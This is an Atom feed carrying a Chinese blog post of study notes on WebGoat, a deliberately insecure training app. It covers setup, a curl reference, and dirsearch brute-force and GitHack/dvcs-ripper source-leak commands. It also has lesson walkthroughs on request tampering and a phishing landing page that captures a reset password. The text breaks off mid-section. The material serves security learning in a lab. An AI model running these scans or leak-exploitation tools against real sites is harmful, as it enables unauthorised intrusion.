<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NoneVector</title>
  <icon>https://www.gravatar.com/avatar/49f85866ff10d3430ba3abb99b227d64</icon>
  
  <link href="https://nonevector.top/atom.xml" rel="self"/>
  
  <link href="https://nonevector.top/"/>
  <updated>2024-01-05T11:00:21.216Z</updated>
  <id>https://nonevector.top/</id>
  
  <author>
    <name>NoneVector</name>
    <email>2339115702@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF之WebGoat学习记录</title>
    <link href="https://nonevector.top/posts/19.html"/>
    <id>https://nonevector.top/posts/19.html</id>
    <published>2023-12-10T10:25:17.643Z</published>
    <updated>2024-01-05T11:00:21.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装-环境配置">安装+环境配置</h2><blockquote><p>不通版本有些地方不一样，因此最好找一样的版本</p></blockquote><p>先要安装jdk、Webgoat和Webwolf</p><p>Webgoat和Webwolf jdk1.8不支持了，需要安装jdk11</p><p>去git上下载Webgoat和Webwolf（只需要webgoat-server-xxx.jar 和 webwolf-xxx.jar就行了，下载后记得放同一个文件夹下，最好路径没中文，虽然有中文也能启动，但是养好习惯）</p><p><a href="https://github.com/WebGoat/WebGoat/releases">链接直达</a></p><p>自行选择版本，我选择的是<strong>8.2.2</strong></p><p>去<a href="https://so.csdn.net/so/search?q=oracle&amp;spm=1001.2101.3001.7020">oracle</a>官网下载（注意版本问题，版本不匹配会报错，8.2.2需要jdk&gt;15)下面是jdk17，然后记得配置环境变量</p><p><a href="%5Bhttps://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html">链接直达</a></p><p>启动命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java –jar webgoat-server-8.2.2.jar --server.port=8080 # 启动webgoat这里开放端口是8080，根据自己需求自己改</span><br><span class="line">java -jar -Dfile.encoding=UTF-8 webwolf-8.2.2.jar --server.port=9090 # 启动webwolf这里开放端口是9090，根据自己需求自己改</span><br></pre></td></tr></table></figure><p>启动后进入浏览器输入(注意大小。。。)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/WebGoat/</span><br><span class="line">localhost:9090/WebWolf/</span><br></pre></td></tr></table></figure><p>WebGoat会自动跳转到login，自行注册就行了，WebWolf用的是WebGoat的账号密码</p><blockquote><p>因为题目全是英格力士，我是用edge浏览器自带翻译功能</p><p>因为博主有刷其他靶场的经验，本靶场仅仅作为博主的笔记</p><p>因此大部分只有答案过程可能并不详细，并且只在需要才会给出步骤图片（懒）</p><p>但是我会在步骤和代码的部分尽量解读（因为如果我也看不懂，我会花功夫讲透😭）</p></blockquote><p>参考资料：</p><p><a href="https://blog.csdn.net/m0_37138074/article/details/128930146">WebGoat-8.2.2版靶机学习总结_webgoat8.2.2-CSDN博客</a></p><h2 id="常用命令和工具">常用命令和工具</h2><p>这里先给出解题比较常用的命令和工具（当然每题的解法多种多样，本人小白一个，我会尽力去找更多的解法的，如有不全，请多包涵）</p><blockquote><p>因为这里要用的工具我都自己有，需要的评论就行</p></blockquote><h3 id="1-curl">1.curl</h3><p>详情请点击<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">这里</a></p><p>这里给出简单的命令集合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line">-a/--append 上传文件时，附加到目标文件  </span><br><span class="line"></span><br><span class="line"> -A/--user-agent &lt;string&gt; 设置用户代理发送给服务器  </span><br><span class="line"></span><br><span class="line"> --anyauth 可以使用“任何”身份验证方法  </span><br><span class="line"></span><br><span class="line"> -b/--cookie &lt;name=string/file&gt; cookie 字符串或文件读取位置  </span><br><span class="line"></span><br><span class="line"> --basic 使用 HTTP 基本验证  </span><br><span class="line"></span><br><span class="line"> -B/--use-ascii 使用 ASCII /文本传输  </span><br><span class="line"></span><br><span class="line"> -c/--cookie-jar &lt;file&gt; 操作结束后把 cookie 写入到这个文件中  </span><br><span class="line"></span><br><span class="line"> -C/--continue-at &lt;offset&gt; 断点续转  </span><br><span class="line"></span><br><span class="line"> -d/--data &lt;data&gt; HTTP POST 方式传送数据  </span><br><span class="line"></span><br><span class="line"> --data-ascii &lt;data&gt; 以 ascii 的方式 post 数据  </span><br><span class="line"></span><br><span class="line"> --data-binary &lt;data&gt; 以二进制的方式 post 数据  </span><br><span class="line"></span><br><span class="line"> --negotiate 使用 HTTP 身份验证  </span><br><span class="line"></span><br><span class="line"> --digest 使用数字身份验证  </span><br><span class="line"></span><br><span class="line"> --disable-eprt 禁止使用 EPRT 或 LPRT  </span><br><span class="line"></span><br><span class="line"> --disable-epsv 禁止使用 EPSV  </span><br><span class="line"></span><br><span class="line"> -D/--dump-header &lt;file&gt; 把 header 信息写入到该文件中  </span><br><span class="line"></span><br><span class="line"> --egd-file &lt;file&gt; 为随机数据(SSL)设置 EGD socket 路径  </span><br><span class="line"></span><br><span class="line"> --tcp-nodelay 使用 TCP_NODELAY 选项  </span><br><span class="line"></span><br><span class="line"> -e/--referer 来源网址  </span><br><span class="line"></span><br><span class="line"> -E/--cert &lt;cert[:passwd]&gt; 客户端证书文件和密码 (SSL)  </span><br><span class="line"></span><br><span class="line"> --cert-type &lt;type&gt; 证书文件类型 (DER/PEM/ENG) (SSL)  </span><br><span class="line"></span><br><span class="line"> --key &lt;key&gt; 私钥文件名 (SSL)  </span><br><span class="line"></span><br><span class="line"> --key-type &lt;type&gt; 私钥文件类型 (DER/PEM/ENG) (SSL)  </span><br><span class="line"></span><br><span class="line"> --pass &lt;pass&gt; 私钥密码 (SSL)  </span><br><span class="line"></span><br><span class="line"> --engine &lt;eng&gt; 加密引擎使用 (SSL). &quot;--engine list&quot; for list  </span><br><span class="line"></span><br><span class="line"> --cacert &lt;file&gt; CA 证书 (SSL)  </span><br><span class="line"></span><br><span class="line"> --capath &lt;directory&gt; CA 目录 (made using c_rehash) to verify peer against (SSL)  </span><br><span class="line"></span><br><span class="line"> --ciphers &lt;list&gt; SSL 密码  </span><br><span class="line"></span><br><span class="line"> --compressed 要求返回是压缩的形势 (using deflate or gzip)  </span><br><span class="line"></span><br><span class="line"> --connect-timeout &lt;seconds&gt; 设置最大请求时间  </span><br><span class="line"></span><br><span class="line"> --create-dirs 建立本地目录的目录层次结构  </span><br><span class="line"></span><br><span class="line"> --crlf 上传是把 LF 转变成 CRLF  </span><br><span class="line"></span><br><span class="line"> -f/--fail 连接失败时不显示 http 错误  </span><br><span class="line"></span><br><span class="line"> --ftp-create-dirs 如果远程目录不存在，创建远程目录  </span><br><span class="line"></span><br><span class="line"> --ftp-method [multicwd/nocwd/singlecwd] 控制 CWD 的使用  </span><br><span class="line"></span><br><span class="line"> --ftp-pasv 使用 PASV/EPSV 代替端口  </span><br><span class="line"></span><br><span class="line"> --ftp-skip-pasv-ip 使用 PASV 的时候,忽略该 IP 地址  </span><br><span class="line"></span><br><span class="line"> --ftp-ssl 尝试用 SSL/TLS 来进行 ftp 数据传输  </span><br><span class="line"></span><br><span class="line"> --ftp-ssl-reqd 要求用 SSL/TLS 来进行 ftp 数据传输  </span><br><span class="line"></span><br><span class="line"> -F/--form &lt;name=content&gt; 模拟 http 表单提交数据  </span><br><span class="line"></span><br><span class="line"> -form-string &lt;name=string&gt; 模拟 http 表单提交数据  </span><br><span class="line"></span><br><span class="line"> -g/--globoff 禁用网址序列和范围使用&#123;&#125;和[]  </span><br><span class="line"></span><br><span class="line"> -G/--get 以 get 的方式来发送数据  </span><br><span class="line"></span><br><span class="line"> -h/--help 帮助  </span><br><span class="line"></span><br><span class="line"> -H/--header &lt;line&gt;自定义头信息传递给服务器  </span><br><span class="line"></span><br><span class="line"> --ignore-content-length 忽略的 HTTP 头信息的长度  </span><br><span class="line"></span><br><span class="line"> -i/--include 输出时包括 protocol 头信息  </span><br><span class="line"></span><br><span class="line"> -I/--head 只显示文档信息</span><br><span class="line"></span><br><span class="line">-j/--junk-session-cookies 读取文件进忽略 session cookie  </span><br><span class="line"></span><br><span class="line"> --interface &lt;interface&gt; 使用指定网络接口/地址  </span><br><span class="line"></span><br><span class="line"> --krb4 &lt;level&gt; 使用指定安全级别的 krb4  </span><br><span class="line"></span><br><span class="line"> -k/--insecure 允许不使用证书到 SSL 站点  </span><br><span class="line"></span><br><span class="line"> -K/--config 指定的配置文件读取  </span><br><span class="line"></span><br><span class="line"> -l/--list-only 列出 ftp 目录下的文件名称  </span><br><span class="line"></span><br><span class="line"> --limit-rate &lt;rate&gt; 设置传输速度  </span><br><span class="line"></span><br><span class="line"> --local-port&lt;NUM&gt; 强制使用本地端口号  </span><br><span class="line"></span><br><span class="line"> -m/--max-time &lt;seconds&gt; 设置最大传输时间  </span><br><span class="line"></span><br><span class="line"> --max-redirs &lt;num&gt; 设置最大读取的目录数  </span><br><span class="line"></span><br><span class="line"> --max-filesize &lt;bytes&gt; 设置最大下载的文件总量  </span><br><span class="line"></span><br><span class="line"> -M/--manual 显示全手动  </span><br><span class="line"></span><br><span class="line"> -n/--netrc 从 netrc 文件中读取用户名和密码  </span><br><span class="line"></span><br><span class="line"> --netrc-optional 使用 .netrc 或者 URL 来覆盖-n  </span><br><span class="line"></span><br><span class="line"> --ntlm 使用 HTTP NTLM 身份验证  </span><br><span class="line"></span><br><span class="line"> -N/--no-buffer 禁用缓冲输出  </span><br><span class="line"></span><br><span class="line"> -o/--output 把输出写到该文件中  </span><br><span class="line"></span><br><span class="line"> -O/--remote-name 把输出写到该文件中，保留远程文件的文件名  </span><br><span class="line"></span><br><span class="line"> -p/--proxytunnel 使用 HTTP 代理  </span><br><span class="line"></span><br><span class="line"> --proxy-anyauth 选择任一代理身份验证方法  </span><br><span class="line"></span><br><span class="line"> --proxy-basic 在代理上使用基本身份验证  </span><br><span class="line"></span><br><span class="line"> --proxy-digest 在代理上使用数字身份验证  </span><br><span class="line"></span><br><span class="line"> --proxy-ntlm 在代理上使用 ntlm 身份验证  </span><br><span class="line"></span><br><span class="line"> -P/--ftp-port &lt;address&gt; 使用端口地址，而不是使用 PASV  </span><br><span class="line"></span><br><span class="line"> -Q/--quote &lt;cmd&gt;文件传输前，发送命令到服务器  </span><br><span class="line"></span><br><span class="line"> -r/--range &lt;range&gt;检索来自 HTTP/1.1 或 FTP 服务器字节范围  </span><br><span class="line"></span><br><span class="line"> --range-file 读取（SSL）的随机文件  </span><br><span class="line"></span><br><span class="line"> -R/--remote-time 在本地生成文件时，保留远程文件时间  </span><br><span class="line"></span><br><span class="line"> --retry &lt;num&gt; 传输出现问题时，重试的次数  </span><br><span class="line"></span><br><span class="line"> --retry-delay &lt;seconds&gt; 传输出现问题时，设置重试间隔时间  </span><br><span class="line"></span><br><span class="line"> --retry-max-time &lt;seconds&gt; 传输出现问题时，设置最大重试时间  </span><br><span class="line"></span><br><span class="line"> -s/--silent 静音模式。不输出任何东西  </span><br><span class="line"></span><br><span class="line"> -S/--show-error 显示错误  </span><br><span class="line"></span><br><span class="line"> --socks4 &lt;host[:port]&gt; 用 socks4 代理给定主机和端口  </span><br><span class="line"></span><br><span class="line"> --socks5 &lt;host[:port]&gt; 用 socks5 代理给定主机和端口  </span><br><span class="line"></span><br><span class="line"> --stderr &lt;file&gt;  </span><br><span class="line"></span><br><span class="line"> -t/--telnet-option &lt;OPT=val&gt; Telnet 选项设置  </span><br><span class="line"></span><br><span class="line"> --trace &lt;file&gt; 对指定文件进行 debug  </span><br><span class="line"></span><br><span class="line"> --trace-ascii &lt;file&gt; Like --跟踪但没有 hex 输出  </span><br><span class="line"></span><br><span class="line"> --trace-time 跟踪/详细输出时，添加时间戳  </span><br><span class="line"></span><br><span class="line"> -T/--upload-file &lt;file&gt; 上传文件  </span><br><span class="line"></span><br><span class="line"> --url &lt;URL&gt; Spet URL to work with  </span><br><span class="line"></span><br><span class="line"> -u/--user &lt;user[:password]&gt;设置服务器的用户和密码  </span><br><span class="line"></span><br><span class="line"> -U/--proxy-user &lt;user[:password]&gt;设置代理用户名和密码  </span><br><span class="line"></span><br><span class="line"> -v/--verbose  </span><br><span class="line"></span><br><span class="line"> -V/--version 显示版本信息  </span><br><span class="line"></span><br><span class="line"> -w/--write-out [format]什么输出完成后  </span><br><span class="line"></span><br><span class="line"> -x/--proxy &lt;host[:port]&gt;在给定的端口上使用 HTTP 代理  </span><br><span class="line"></span><br><span class="line"> -X/--request &lt;command&gt;指定什么命令  </span><br><span class="line"></span><br><span class="line"> -y/--speed-time 放弃限速所要的时间。默认为 30  </span><br><span class="line"></span><br><span class="line"> -Y/--speed-limit 停止传输速度的限制，速度时间&#x27;秒  </span><br><span class="line"></span><br><span class="line"> -z/--time-cond 传送时间设置  </span><br><span class="line"></span><br><span class="line"> -0/--http1.0 使用 HTTP 1.0  </span><br><span class="line"></span><br><span class="line"> -1/--tlsv1 使用 TLSv1（SSL）  </span><br><span class="line"></span><br><span class="line"> -2/--sslv2 使用 SSLv2 的（SSL）  </span><br><span class="line"></span><br><span class="line"> -3/--sslv3 使用的 SSLv3（SSL）  </span><br><span class="line"></span><br><span class="line"> --3p-quote like -Q for the source URL for 3rd party transfer  </span><br><span class="line"></span><br><span class="line"> --3p-url 使用 url，进行第三方传送  </span><br><span class="line"></span><br><span class="line"> --3p-user 使用用户名和密码，进行第三方传送  </span><br><span class="line"></span><br><span class="line"> -4/--ipv4 使用 IP4  </span><br><span class="line"></span><br><span class="line"> -6/--ipv6 使用 IP6  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> -#</span><span class="language-bash">/--progress-bar 用进度条显示当前的传送状态</span></span><br><span class="line"></span><br><span class="line">————</span><br><span class="line"></span><br><span class="line">后置：</span><br><span class="line"></span><br><span class="line">-v 显示详细信息（verbose 缩写），包括 IP 解析过程</span><br><span class="line"></span><br><span class="line">-i 显示头信息</span><br><span class="line"></span><br><span class="line">-I 只显示头信息</span><br></pre></td></tr></table></figure><h3 id="2-burp">2.burp</h3><p>这个很有用，集渗透，爆破等等一系列模块的软件，这里不多介绍，有兴趣可以去看国人写的介绍 👉<a href="https://t0data.gitbooks.io/burpsuite/content/">Burp Suite 实战指南</a></p><blockquote><p>软件没有的话懒得去找可以留言找我，burp 实战指南 pdf 版我也有</p></blockquote><p><a href="https://blog.csdn.net/crisprx/article/details/104181954">如何设置burp监听webgoat</a></p><p>主要步骤：<a href="https://blog.csdn.net/crisprx/article/details/104181954">burpsuite无法捕捉localhost包的解决方法</a></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/7.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/8.png" alt=""></p><h3 id="3-F12">3.F12</h3><p>浏览器 f12 自带的开发者模式,有关在客户端方面的很多都用开发者模式解决</p><h3 id="4-dirsearch">4.dirsearch</h3><p>dirsearch 是一个基于 python 的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件，用于探测 WEB 服务器下的****敏感文件/目录****的命令行工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常用命令</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx //日常使用</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r //递归扫描，不过容易被检测</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 //线程控制请求速率</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080 //使用代理</span><br></pre></td></tr></table></figure><p>下载教程及说明 👉<a href="https://www.nonevector.top/posts/18.html">点击直达</a></p><p>ps:网上一大坨教程我找了好久才找到有用的 😭</p><h3 id="5-GitHack">5.GitHack</h3><p>GitHack is a .git folder disclosure exploit.</p><p>It rebuild source code from .git folder while keep directory structure unchanged.</p><p>GitHack 是一个.git 泄露利用脚本，通过泄露的.git 文件夹下的文件，重建还原工程源代码。</p><p>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL 注射等 web 安全漏洞。</p><p>下载需要使用 git 命令</p><p><a href="https://zhuanlan.zhihu.com/p/242540359">windows 下载 git</a></p><p>linux 系统下载 git 使用命令行<code>yum install git</code></p><p>然后在自己想要的文件位置使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/BugScanTeam/GitHack</span><br></pre></td></tr></table></figure><p>值得一提的是 GitHack 只能在 Python2 的环境下运行</p><h3 id="6-dvcs-ripper">6.dvcs-ripper</h3><p>泄露漏洞利用工具，在 linux 里面使用（可以找.svn，.hg 等等）</p><p>使用 git 下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>然后使用命令下载需要组件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure><p>即可</p><h3 id="7-password">7.password</h3><p>字典需要准备好，用于爆破</p><h3 id="8-编码-解码工具">8.编码/解码工具</h3><p>我个人用的是</p><p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode"> 在线工具 </a></p><p><a href="http://www.atoolbox.net/">atoolbox</a></p><p><a href="https://www.cmd5.com/">md5在线解密破解</a>（用于hash）</p><p>当然这个自己随便自己找一个就行</p><h2 id="1-Introduction">1.Introduction</h2><h3 id="1-WebGoat">1.WebGoat</h3><blockquote><p>WebGoat is a deliberately insecure application that allows interested developers just like you to test vulnerabilities commonly found in Java-based applications that use common and popular open source components.</p><p>Now, while we in no way condone causing intentional harm to any animal, goat or otherwise, we think learning everything you can about security vulnerabilities is essential to understanding just what happens when even a small bit of unintended code gets into your applications.</p><p>What better way to do that than with your very own scapegoat?</p><p>Feel free to do what you will with him. Hack, poke, prod and if it makes you feel better, scare him until your heart’s content. Go ahead, and hack the goat. We promise he likes it.</p><p>Thanks for your interest!</p><p>The WebGoat Team</p><p>机翻：</p><p>WebGoat是一个故意不安全的应用程序，它允许像您一样感兴趣的开发人员测试在使用常见和流行的开源组件的基于java的应用程序中常见的漏洞。</p><p>现在，虽然我们绝不容忍对任何动物、山羊或其他动物造成故意伤害，但我们认为，了解有关安全漏洞的一切知识对于理解即使是一小部分意外代码进入应用程序时会发生什么也是必不可少的。</p><p>还有什么比找你自己的替罪羊更好的办法吗?</p><p>随你怎么处置他。砍啊，戳啊，戳啊，如果能让你感觉好点，就把他吓个半死。来吧，砍山羊。我们保证他会喜欢的。</p><p>谢谢你的关注!</p><p>WebGoat团队</p></blockquote><h3 id="2-WebWolf">2.WebWolf</h3><h4 id="1-Introducing-WebWolf">1.Introducing WebWolf</h4><blockquote><p>只有当课程指定您可以使用 WebWolf 时(一般右下角会有一头狼的图标，您才需要它。对于很多课程，您使用 WebGoat 而不使用 启动 WebWolf。如果您需要使用 WebWolf 进行练习，请确保它与 WebGoat 一起运行。</p><p>您也没有义务使用 WebWolf，您也可以使用您喜欢的任何拦截工具</p></blockquote><h4 id="2-Uploading-files">2.Uploading files</h4><p>教导如何上传文件</p><h4 id="3-Your-own-mailbox">3.Your own mailbox</h4><p>WebWolf提供邮箱客户端</p><p>随便输入什么都会在返回一封邮件</p><p>打开邮件后会有flag，输入就行（其实就是你的用户名反过来）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/2.png" alt="1"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/1.png" alt="1"></p><h4 id="4-Landing-page">4.Landing page</h4><blockquote><p>Suppose we tricked a user to click on a link he/she received in an email, this link will open up our crafted password reset link page. The user does not notice any differences compared to the normal password reset page of the company. The user enters a new password and hits enter. The new password will be sent to your host. In this case the new password will be sent to WebWolf. Try to locate the unique code.</p><p>Please be aware that after resetting the password the user will receive an error page. In a real attack scenario the user would probably see a normal success page (this is due to a limit what we can control with WebWolf)</p><p>假设我们诱骗用户点击他/她在电子邮件中收到的链接，此链接将打开我们精心制作的链接 密码重置链接页面。与公司的正常密码重置页面相比，用户没有注意到任何差异。 用户输入新密码并按回车键。新密码将发送给您的主机。在这种情况下，新的 密码将发送到 WebWolf。尝试找到唯一代码。</p><p>请注意，重置密码后，用户将收到一个错误页面。在实际攻击场景中， 用户可能会看到一个正常的成功页面（这是由于我们可以使用 WebWolf 控制的限制）</p></blockquote><p>点击蓝色的链接</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/3.png" alt="3"></p><p>随便输入密码</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/4.png" alt="4"></p><p>密码会出现在url中以及flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/5.png" alt="5"></p><h2 id="2-General">2.General</h2><h3 id="1-HTTP-Basics">1.HTTP Basics</h3><p>这一部分介绍了http的GET方法和POST方法的区别，简单区分就是GET方法的参数直接通过url传递，POST的参数则通过包来传递。</p><h4 id="2">2</h4><p>该题看一下翻译叫我们输入名字就行了，没什么好说的</p><h4 id="3">3</h4><p>这题问上题http的methon是GET还是POST，url没变就是POST</p><p>然后问我们magic number ，这里就需要抓包了</p><p>打开burp开启拦截（没找到就Forward，一个一个看）就能找到</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/6.png" alt="6"></p><h3 id="2-HTTP-Proxies">2.HTTP Proxies</h3><p>这里主要介绍的是ZAP代理工具，因为我使用的是burp，所以不在介绍ZAP，有兴趣自行学习，我们直接跳到第6题</p><h4 id="6">6</h4><p>这题是要你修改请求包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Change the Method to GET </span><br><span class="line">2.Add a header &#x27;x-request-intercepted:true&#x27;</span><br><span class="line">3.Remove the request body and instead send &#x27;changeMe&#x27; as query string parameter and set the value to &#x27;Requests are tampered easily&#x27; (without the single quotes)</span><br><span class="line"></span><br><span class="line">把POST改成GET，添加头部x-request-intercepted:true，把changeMe的字符串改成Requests are tampered easily</span><br></pre></td></tr></table></figure><p>（下图未修改，修改仅仅是添加和修改，图片忘记保存了，不是很难就算了 <s>懒</s>）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/9.png" alt="9"></p><h3 id="3-Developer-Tools">3.Developer Tools</h3><p>这里介绍的是开发者工具，也就是F12，老样子我们直接跳到第4题和第6题</p><h4 id="4">4</h4><p>按照题意叫我们使用 ``webgoat.customjs.phoneHome()`函数就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/10.png" alt="10"></p><h4 id="6-2">6</h4><p>这题是要我们观察发送的请求包（点击go）</p><p>然后去网络的选项找network的包</p><p>请求里面有networkNum</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/11.png" alt="11"></p><h3 id="4-CIA-Triad">4.CIA Triad</h3><blockquote><p>The CIA Triad (confidentiality, integrity, availability) is a model for information security. The three elements of the triad are considered the most crucial information security components and should be guaranteed in any secure system.</p><p>CIA（保密性、完整性、可用性）是信息安全的典范。 三合会的三个要素被认为是最关键的信息安全组件，在任何安全系统中都应该得到保证</p></blockquote><h4 id="5">5</h4><p>这题不好做解释，我就放出答案吧</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/12.png" alt="12"></p><h3 id="5-Crypto-Basics">5.Crypto Basics</h3><blockquote><p>This lesson explains different types of cryptography techniques that are commonly used in web applications.</p><p>本 节 课 介绍 了 Web 应用程序中 常用 的 不同 类型 的 加密 技术。</p></blockquote><h4 id="2-Base64-Encoding">2.Base64 Encoding</h4><p>随便找个base64解密网站就行了（我上面工具有）</p><p><img 